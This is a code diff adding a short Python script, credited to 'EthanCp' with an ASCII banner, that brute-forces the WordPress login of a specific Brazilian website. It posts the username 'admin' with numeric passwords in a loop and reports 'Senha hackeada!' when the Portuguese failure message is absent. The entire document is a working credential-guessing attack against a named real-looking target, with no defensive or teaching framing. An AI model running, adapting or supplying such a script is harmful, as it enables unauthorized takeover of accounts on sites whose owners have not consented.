@@ -1,0 +1,15 @@
+import requests
+print('''
+___                              
+ | _   ._  _.  ._ _ o _|o _.   _ ._  
+ |(_)  | |(_|  | | ||(_||(_|  (_ |_) 
+                                 |
+                    By: EthanCp
+''')
+for a in range(1000, 9999999999999):
+    payload = dict(log='admin', pwd=a)
+    r = requests.post('https://tonamidiacp.com.br/wp-login.php', data=payload)
+    if 'A senha informada para o ' in r.text:
+        print('  [+] Tentativa: {} Mal sucedida!'.format(a))
+    else:
+        print('  [!] Senha hackeada!\n  [+] User: {}\n  [+] Pass: {}\n'.format('admin', a))
